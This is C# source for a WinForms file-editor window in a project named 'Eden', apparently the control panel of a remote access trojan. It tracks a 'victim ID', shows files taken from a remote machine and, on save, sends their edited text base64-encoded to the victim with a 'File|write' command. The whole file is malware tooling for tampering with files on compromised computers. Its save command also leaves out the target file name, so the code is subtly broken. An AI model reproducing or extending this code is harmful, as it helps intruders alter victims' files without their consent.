using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Formats.Tar;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using ICSharpCode.TextEditor;
using ICSharpCode.TextEditorEx;

namespace Eden
{
    public partial class frmFileEditor : Form
    {
        public clsClient m_clnt;
        public string m_szVictimID;

        private struct stTabInfoTag
        {
            public string szFilename;
        }

        public frmFileEditor()
        {
            InitializeComponent();
        }

        #region Function

        private bool FileNotSave()
        {
            return tabControl1.SelectedTab.Text.Contains("*");
        }

        private (TextBox tbFileName, TextEditorControlEx editorEx, TextBox tbFindPattern) GetTabPageControls(TabPage page = null)
        {
            page = page ?? tabControl1.SelectedTab;
            if (page == null)
                return (null, null, null);

            TextBox tbFileName = (TextBox)page.Controls[0];
            TextEditorControlEx editorEx = (TextEditorControlEx)page.Controls[1];
            TextBox tbFindPattern = (TextBox)page.Controls[2];

            return (tbFileName, editorEx, tbFindPattern);
        }

        public void ShowFileContent(string szFilename, string szContent)
        {
            if (FindPage(szFilename) is TabPage t)
            {
                tabControl1.SelectedTab = t;
                var x = GetTabPageControls(t);
                x.editorEx.Text = szContent;

                return;
            }

            TextBox tbFilename = new TextBox();
            TextEditorControlEx editorControl = new TextEditorControlEx();
            TextBox tbFind = new TextBox();

            TabPage page = new TabPage();
            page.Text = Path.GetFileName(szFilename);
            page.Controls.AddRange(new Control[]
            {
                tbFilename,
                editorControl,
                tbFind,
            });

            tbFilename.Dock = DockStyle.Top;
            editorControl.Dock = DockStyle.Fill;
            tbFind.Dock = DockStyle.Bottom;

            tbFilename.SendToBack();
            tbFind.SendToBack();

            stTabInfoTag st = new stTabInfoTag()
            {
                szFilename = szFilename,
            };

            page.Tag = st;

            tabControl1.TabPages.Add(page);
            tabControl1.SelectedTab = page;

            tbFilename.Text = szFilename;
            editorControl.Text = szContent;

            #region Set Event

            editorControl.TextChanged += TextEditor_TextChanged;

            #endregion
        }

        private TabPage FindPage(string szFilename)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                stTabInfoTag st = (stTabInfoTag)page.Tag;
                if (st.szFilename == szFilename)
                    return page;
            }

            return null;
        }

        private void SaveFile(TabPage page = null)
        {
            Invoke(new Action(() =>
            {
                if (page == null)
                    page = tabControl1.SelectedTab;

                var x = GetTabPageControls(page);
                m_clnt.SendVictim(m_szVictimID, $"File|write|{EZCrypto.Encoder.stre2b64(x.editorEx.Text)}");
            }));
        }
        private void SaveAllFiles()
        {
            foreach (TabPage page in tabControl1.TabPages)
                SaveFile(page);
        }

        #endregion

        #region Event Handler

        private void TextEditor_TextChanged(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            if (!page.Text.Contains("*"))
                page.Text += "*";
        }

        #endregion

        void setup()
        {
            foreach (TabPage page in tabControl1.TabPages)
                tabControl1.TabPages.Remove(page);
        }

        private void frmFileEditor_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmFileEditor_FormClosed(object sender, FormClosedEventArgs e)
        {

        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.S)
                {
                    TabPage page = tabControl1.SelectedTab;

                    if (page == null)
                        return;

                    if (page.Text.Contains("*"))
                    {
                        SaveFile();

                        page.Text = page.Text.Replace("*", string.Empty);
                    }
                }
                else if (e.KeyCode == Keys.W)
                {
                    TabPage page = tabControl1.SelectedTab;

                    if (page == null)
                        return;

                    if (FileNotSave())
                    {
                        DialogResult dr = MessageBox.Show("Do you want to save this file ?", "Wait", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                        if (dr == DialogResult.Yes)
                        {
                            SaveFile();
                        }
                    }

                    tabControl1.TabPages.Remove(page);
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {

                }
            }
        }
    }
}
